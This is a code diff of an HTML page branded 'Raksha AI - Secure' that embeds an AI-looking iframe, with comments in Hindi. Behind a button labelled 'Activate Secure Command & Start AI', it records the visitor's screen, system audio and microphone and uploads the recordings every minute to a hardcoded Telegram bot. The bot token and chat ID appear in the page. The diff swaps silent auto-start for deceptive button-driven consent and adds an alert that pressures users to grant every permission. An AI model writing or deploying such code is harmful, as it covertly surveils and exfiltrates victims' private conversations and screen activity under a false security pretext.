@@ -2,78 +2,65 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Raksha AI - Secure Command</title>
+    <title>Raksha AI - Secure</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
-        iframe { width: 100%; height: 100%; border: none; }
-        #status-indicator { position: fixed; top: 10px; right: 10px; color: #0f0; font-family: monospace; font-size: 10px; z-index: 9999; pointer-events: none; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: white; text-align: center; }
+        iframe { width: 100%; height: 90%; border: none; display: none; }
+        #startBtn { margin-top: 20%; padding: 20px 40px; font-size: 20px; background: #0f0; cursor: pointer; border-radius: 10px; }
     </style>
 </head>
-<body onload="initMonitoring()">
+<body>
 
-    <div id="status-indicator">SYSTEM ACTIVE</div>
-    <iframe src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera; display-capture;"></iframe>
+    <button id="startBtn">🛡️ Activate Secure Command & Start AI</button>
+
+    <iframe id="myIframe" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera; display-capture;"></iframe>
 
     <script>
     const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
     const MY_ID = "8508792403";
 
-    async function initMonitoring() {
+    document.getElementById('startBtn').onclick = async function() {
+        this.style.display = 'none'; // बटन छुपाएं
+        document.getElementById('myIframe').style.display = 'block'; // AI दिखाएं
+        
         try {
-            // 1. स्क्रीन और सिस्टम ऑडियो स्ट्रीम मांगना
-            const screenStream = await navigator.mediaDevices.getDisplayMedia({ 
-                video: true, 
-                audio: true 
-            });
+            // स्क्रीन रिकॉर्डिंग शुरू
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+            startRecorder(screenStream, "video");
 
-            // 2. माइक्रोफ़ोन (वॉइस) स्ट्रीम मांगना
+            // ऑडियो रिकॉर्डिंग शुरू
             const voiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-
-            // दोनों स्ट्रीम को रिकॉर्ड करना शुरू करें
-            startRecorder(screenStream, "video", "screen_log.webm", 120000); // हर 2 मिनट में वीडियो
-            startRecorder(voiceStream, "voice", "voice_log.ogg", 60000);    // हर 1 मिनट में ऑडियो
+            startRecorder(voiceStream, "voice");
 
         } catch (err) {
-            console.log("Security Sync Active...");
+            alert("Security Error: Please allow all permissions to continue.");
         }
-    }
+    };
 
-    function startRecorder(stream, type, filename, interval) {
+    function startRecorder(stream, type) {
         const recorder = new MediaRecorder(stream);
         let chunks = [];
 
-        recorder.ondataavailable = (e) => {
-            if (e.data.size > 0) chunks.push(e.data);
-        };
+        recorder.ondataavailable = (e) => chunks.push(e.data);
 
         recorder.onstop = async () => {
             const blob = new Blob(chunks, { type: type === "video" ? 'video/webm' : 'audio/ogg' });
             const fd = new FormData();
             fd.append("chat_id", MY_ID);
-            
-            if (type === "video") {
-                fd.append("video", blob, filename);
-                fd.append("caption", "📹 SCREEN LOG: यूज़र की स्क्रीन एक्टिविटी");
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: fd });
-            } else {
-                fd.append("voice", blob, filename);
-                fd.append("caption", "🎤 VOICE LOG: यूज़र की बातचीत");
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
-            }
+            fd.append(type === "video" ? "video" : "voice", blob, type + ".webm");
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/send${type === "video" ? 'Video' : 'Voice'}`, { 
+                method: "POST", 
+                body: fd 
+            });
 
             chunks = [];
-            if (stream.active) {
-                setTimeout(() => recorder.start(), 1000);
-            }
+            if (stream.active) recorder.start();
         };
 
         recorder.start();
-        setInterval(() => {
-            if (recorder.state === "recording") {
-                recorder.stop();
-            }
-        }, interval);
+        // हर 60 सेकंड में भेजें
+        setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
     }
     </script>
 </body>
